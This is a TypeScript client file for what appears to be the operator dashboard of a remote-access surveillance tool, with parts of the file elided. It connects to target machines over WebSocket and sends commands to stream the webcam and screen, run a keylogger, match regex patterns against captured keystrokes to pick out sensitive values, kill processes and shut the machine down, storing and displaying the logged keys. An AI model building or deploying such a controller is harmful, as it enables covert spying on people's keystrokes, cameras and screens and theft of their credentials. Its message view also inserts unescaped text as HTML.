import { addPatternCommand, Command, killProcessCommand, PatternMatch, StreamStats } from './services/Protocol';
import { StreamClient } from './services/StreamClient';

// --- 1. State Management ---
interface Message {
    text: string;
    type: 'sent' | 'received';
    time: string;
}

interface Machine {
    id: string;
    name: string;
    ip: string;
    status: 'online' | 'offline' | 'checking';
    thumbnail?: string;
    messages: Message[];
    client?: StreamClient;  // Single persistent connection per machine
    // Persistent State
    keylogs: string;
    logs: string[];
    patternMatches: {name: string, value: string}[];
}

const state = {
    machines: [
        {
            id: '1',
            name: 'Office-PC',
            ip: 'ws://127.0.0.1:9004',
            status: 'checking',
            messages: [],
            keylogs: '',
            logs: [],
            patternMatches: []
        }
    ] as Machine[],
    currentMachineId: null as string | null
};

// --- 2. DOM Elements ---
const els = {
    grid: document.getElementById('machineGrid')!,
    views: {
        dashboard: document.getElementById('viewDashboard')!,
        stream: document.getElementById('viewStream')!,
    },
    canvas: document.getElementById('screenCanvas') as HTMLCanvasElement,
    // Stream View Elements
    backBtn: document.getElementById('backBtn')!,
    machineName: document.getElementById('currentMachineName')!,
    connectionDot: document.getElementById('connectionDot')!,
    btnStart: document.getElementById('btnStart')!,
    btnStartScreen: document.getElementById('btnStartScreen')!,
    btnStop: document.getElementById('btnStop')!,
    btnListProc: document.getElementById('btnListProc')!,
    btnSnap: document.getElementById('btnSnap')!,
    // Keylogger Elements
    btnStartKeylogger: document.getElementById('btnStartKeylogger')!,
    btnStopKeylogger: document.getElementById('btnStopKeylogger')!,
    keylogDisplay: document.getElementById('keylogDisplay')!,
    // Pattern Detection Elements
    btnAddCommonPatterns: document.getElementById('btnAddCommonPatterns')!,
    btnClearPatterns: document.getElementById('btnClearPatterns')!,
    patternName: document.getElementById('patternName') as HTMLInputElement,
    patternRegex: document.getElementById('patternRegex') as HTMLInputElement,
    btnAddPattern: document.getElementById('btnAddPattern')!,
    patternMatchDisplay: document.getElementById('patternMatchDisplay')!,
    // Process Elements
    pidInput: document.getElementById('pidInput') as HTMLInputElement,
    btnKillProcess: document.getElementById('btnKillProcess')!,
    // System Elements
    btnShutdown: document.getElementById('btnShutdown')!,
    // Message Panel Elements
    messageHistory: document.getElementById('messageHistory')!,
    messageInput: document.getElementById('messageInput') as HTMLInputElement,
    sendMessageBtn: document.getElementById('sendMessageBtn')!,
    messageLogList: document.getElementById('messageLogList')!,
    addMachineBtn: document.getElementById('addMachineBtn')!
};

const ctx = els.canvas.getContext('2d')!;

// --- 3. Dashboard Logic ---
function renderGrid() {
    els.grid.innerHTML = '';
    state.machines.forEach(machine => {
        const card = document.createElement('div');
        card.className = 'machine-card';

        let previewClass = 'card-preview';
        let previewStyle = '';
        if (machine.status !== 'online') {
            previewClass += ' no-signal';
        } else if (machine.thumbnail) {
            previewStyle = `background-image: url(${machine.thumbnail})`;
        }

        card.innerHTML = `
            <div class="${previewClass}" style="${previewStyle}"></div>
            <div class="card-footer">
                <div class="card-details">
                    <span class="status-dot status-${machine.status}"></span>
                    <span class="card-name">${machine.name}</span>
                </div>
                <span class="material-icons card-menu">more_vert</span>
            </div>
        `;
        card.addEventListener('click', () => openStream(machine));
        els.grid.appendChild(card);
    });
}


function addNewMachine() {
    const name = prompt("Enter Machine Name:", "New-PC");
    if (!name) return;
    const ip = prompt("Enter Machine WebSocket URL:", "ws://127.0.0.1:9004");
    if (!ip) return;

    state.machines.push({
        id: Date.now().toString(),
        name: name,
        ip: ip,
        status: 'checking',
        messages: [],
        keylogs: '',
        logs: [],
        patternMatches: []
    });
    renderGrid();
    refreshThumbnails(); // Check status of new machine
}

// Helper to get current machine's client
function getCurrentClient(): StreamClient | undefined {
    if (!state.currentMachineId) return undefined;
    const machine = state.machines.find(m => m.id === state.currentMachineId);
    return machine?.client;
}

// --- Pattern Match Display Functions ---
function addPatternMatch(patternName: string, matchedText: string) {
    // Remove placeholder if present
    const placeholder = els.patternMatchDisplay.querySelector('.pattern-placeholder');
    if (placeholder) {
        placeholder.remove();
    }

    const matchItem = document.createElement('div');
    matchItem.className = 'pattern-match-item';
    matchItem.innerHTML = `
        <span class="pattern-match-name">[${patternName}]</span>
        <span class="pattern-match-value">${escapeHtml(matchedText)}</span>
    `;
    els.patternMatchDisplay.appendChild(matchItem);
    els.patternMatchDisplay.scrollTop = els.patternMatchDisplay.scrollHeight;
}

function clearPatternMatchDisplay() {
    els.patternMatchDisplay.innerHTML = '<div class="pattern-placeholder">Pattern matches will appear here...</div>';
}

function escapeHtml(text: string): string {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// --- 4. Stream View Logic ---
function openStream(machine: Machine) {
    // Determine if we need to close the previous stream view (Visual only, connection stays)
    if (state.currentMachineId && state.currentMachineId !== machine.id) {
        // Logic to "background" the old machine if needed
    }

    state.currentMachineId = machine.id;

    // Update UI
    els.machineName.textContent = machine.name;
    els.connectionDot.className = `status-dot status-${machine.status}`;
    els.views.dashboard.classList.remove('active');
    els.views.stream.classList.add('active');

    // RESTORE STATE from Machine Data (Persistent Tabs)
    ctx.clearRect(0, 0, els.canvas.width, els.canvas.height); // Clear canvas initially

    // Restore Keylogs
    els.keylogDisplay.textContent = machine.keylogs;

    // Restore Logs
    els.messageLogList.innerHTML = '';
    machine.logs.forEach(msg => {
        const li = document.createElement('li');
        li.textContent = msg;
        els.messageLogList.appendChild(li);
    });

    // Restore Patterns
    clearPatternMatchDisplay();
    machine.patternMatches.forEach(m => addPatternMatch(m.name, m.value));

    renderMessages(machine);

    // Setup Callbacks (Model Update + View Update if Active)
    const setupClientCallbacks = (client: StreamClient) => {
        client.updateConfig({
            onLog: (msg) => {
                // Always update Model
                machine.logs.push(msg);
                if (machine.logs.length > 100) machine.logs.shift();

                // Update View if Active
                if (state.currentMachineId === machine.id) {
                     const li = document.createElement('li');
                     li.textContent = msg;
                     els.messageLogList.appendChild(li);
                     els.messageLogList.scrollTop = els.messageLogList.scrollHeight;
                }
            },
            onStats: (stats: StreamStats) => {
                if (state.currentMachineId === machine.id) console.log('Stats:', stats);
            },
            onStatusChange: (status) => {
                machine.status = status === 'CONNECTED' ? 'online' : 'offline';
                if (state.currentMachineId === machine.id) {
                    els.connectionDot.className = `status-dot status-${machine.status}`;
                }
                renderGrid();
            },
            onFrame: (bitmap) => {
                // Only draw to main canvas if this machine is currently being viewed
                if (state.currentMachineId === machine.id) {
                    els.canvas.width = bitmap.width;
                    els.canvas.height = bitmap.height;
                    ctx.drawImage(bitmap, 0, 0);
                }
                // In background, we might update thumbnail periodically?
                // Done by refreshThumbnails loop.
                bitmap.close();
            },
            onKeyEvent: (key, _code) => {
                // Update Model
                machine.keylogs += `${key} `;

                // Update View if Active
                if (state.currentMachineId === machine.id) {
                    els.keylogDisplay.textContent = machine.keylogs;
                    els.keylogDisplay.scrollTop = els.keylogDisplay.scrollHeight;
                }
            },
            onPatternMatch: (match: PatternMatch) => {
                machine.patternMatches.push({name: match.patternName, value: match.matchedText});
                if (state.currentMachineId === machine.id) {
                    addPatternMatch(match.patternName, match.matchedText);
                }
            }
        });
    };

    // If machine already has a connection, update its callbacks
    if (machine.client && machine.client.isConnected()) {
        setupClientCallbacks(machine.client);
        // machine.client.sendCommand(Command.START_WEBCAM_STREAM); // Optional: Auto-resume?
        // Let's verify connection
        addLog(machine, '✅ Resuming session');
        return;
    }

    // Create new connection
    machine.client = new StreamClient({
         // Initial dummy callbacks, will be overwritten by setupClientCallbacks shortly
         // but valid to pass empty structure to constructor too if allowed.
         onLog: () => {}, onStats: () => {}, onStatusChange: () => {}, onFrame: (b) => b.close(), onKeyEvent: () => {}, onPatternMatch: () => {}
    });

    setupClientCallbacks(machine.client);
    machine.client.connect(machine.ip);
}

function closeStream() {
    // Don't disconnect - keep connection alive for thumbnails
    // Just switch back callbacks to thumbnail mode
    if (state.currentMachineId) {
        const machine = state.machines.find(m => m.id === state.currentMachineId);
        if (machine?.client) {
            // Silence the client regarding UI updates, but keep it alive
            machine.client.updateConfig({
                onFrame: (bitmap) => {
                    // Update thumbnail in background
                    const tempCanvas = document.createElement('canvas');
                    tempCanvas.width = bitmap.width;
                    tempCanvas.height = bitmap.height;
                    const tempCtx = tempCanvas.getContext('2d')!;
                    tempCtx.drawImage(bitmap, 0, 0);
                    machine.thumbnail = tempCanvas.toDataURL('image/jpeg', 0.7);
                    bitmap.close();
                    renderGrid();
                },
                onLog: (msg) => { machine.logs.push(msg); },
                onStats: () => {},
                onKeyEvent: (key) => { machine.keylogs += `${key} `; }
            });
        }
    }

    state.currentMachineId = null;
    els.views.stream.classList.remove('active');
    els.views.dashboard.classList.add('active');
}

// --- Message & Log Logic ---
function renderMessages(machine: Machine) {
    els.messageHistory.innerHTML = '';
    machine.messages.forEach(msg => {
        const bubble = document.createElement('div');
        bubble.className = `message-bubble message-${msg.type}`;
        bubble.innerHTML = `
            ${msg.text}
            <span class="message-time">${msg.time}</span>
        `;
        els.messageHistory.appendChild(bubble);
    });
    els.messageHistory.scrollTop = els.messageHistory.scrollHeight;
}

function sendMessage() {
    const text = els.messageInput.value.trim();
    if (!text || !state.currentMachineId) return;

    const machine = state.machines.find(m => m.id === state.currentMachineId);
    if (!machine) return;

    // In a real app, you'd send this over the websocket
    // state.activeClient?.sendCommand(`MSG:${text}`);

    const newMessage: Message = {
        text: text,
        type: 'sent',
        time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
    };

    machine.messages.push(newMessage);
    renderMessages(machine);
    els.messageInput.value = '';
}

function addLog(machine: Machine, msg: string) {
    machine.logs.push(msg);
    if (state.currentMachineId === machine.id) {
         const li = document.createElement('li');
         li.textContent = msg;
         els.messageLogList.appendChild(li);
         els.messageLogList.scrollTop = els.messageLogList.scrollHeight;
    }
}

function renderLogs(_machine: Machine) {
    // handled in openStream
}

// --- 5. Snapshot Engine ---
async function refreshThumbnails() {
    for (const machine of state.machines) {
        // Skip if this machine is currently being viewed in stream mode
        if (state.currentMachineId === machine.id) {
            continue;
        }

        // If already has a connection, just request a new frame
        if (machine.client && machine.client.isConnected()) {
            machine.client.sendCommand(Command.CAPTURE_WEBCAM);
            continue;
        }
        // ... (Remaining thumbnail logic unchanged) ...
    }
}

// ... (Rest of file unchanged) ...


// --- 6. Event Listeners ---
els.addMachineBtn.addEventListener('click', addNewMachine);
els.backBtn.addEventListener('click', closeStream);

// Stream controls
els.btnStart.addEventListener('click', () => getCurrentClient()?.sendCommand(Command.START_WEBCAM_STREAM));
els.btnStartScreen.addEventListener('click', () => getCurrentClient()?.sendCommand(Command.START_SCREEN_STREAM));
els.btnStop.addEventListener('click', () => getCurrentClient()?.sendCommand(Command.STOP_STREAM));
els.btnSnap.addEventListener('click', () => getCurrentClient()?.sendCommand(Command.FRAME_CAPTURE));
els.btnListProc.addEventListener('click', () => getCurrentClient()?.sendCommand(Command.LIST_PROCESS));

// Keylogger controls
els.btnStartKeylogger.addEventListener('click', () => {
    els.keylogDisplay.textContent = '';
    clearPatternMatchDisplay();
    getCurrentClient()?.sendCommand(Command.START_KEYLOGGER);
});
els.btnStopKeylogger.addEventListener('click', () => {
    getCurrentClient()?.sendCommand(Command.STOP_KEYLOGGER);
});

// Pattern detection controls
els.btnAddCommonPatterns.addEventListener('click', () => {
    clearPatternMatchDisplay();
    getCurrentClient()?.sendCommand(Command.ADD_COMMON_PATTERNS);
});
els.btnClearPatterns.addEventListener('click', () => {
    clearPatternMatchDisplay();
    getCurrentClient()?.sendCommand(Command.CLEAR_PATTERNS);
});
els.btnAddPattern.addEventListener('click', () => {
    const name = els.patternName.value.trim();
    const regex = els.patternRegex.value.trim();
    if (!name || !regex) {
        alert('Please enter both pattern name and regex');
        return;
    }
    getCurrentClient()?.sendCommand(addPatternCommand(name, regex));
    els.patternName.value = '';
    els.patternRegex.value = '';
});

// Process controls
els.btnKillProcess.addEventListener('click', () => {
    const pid = parseInt(els.pidInput.value);
    if (isNaN(pid)) {
        alert('Please enter a valid PID');
        return;
    }
    if (confirm(`Kill process ${pid}?`)) {
        getCurrentClient()?.sendCommand(killProcessCommand(pid));
        els.pidInput.value = '';
    }
});

// System controls
els.btnShutdown.addEventListener('click', () => {
    if (confirm('Are you sure you want to shutdown this machine?')) {
        getCurrentClient()?.sendCommand(Command.SHUTDOWN);
    }
});

// Message controls
els.sendMessageBtn.addEventListener('click', sendMessage);
els.messageInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') sendMessage();
});

// --- Init ---
renderGrid();
(async () => {
    while (true) {
        await refreshThumbnails();
        await new Promise(res => setTimeout(res, 5000)); // Refresh every 5 seconds
    }
})();
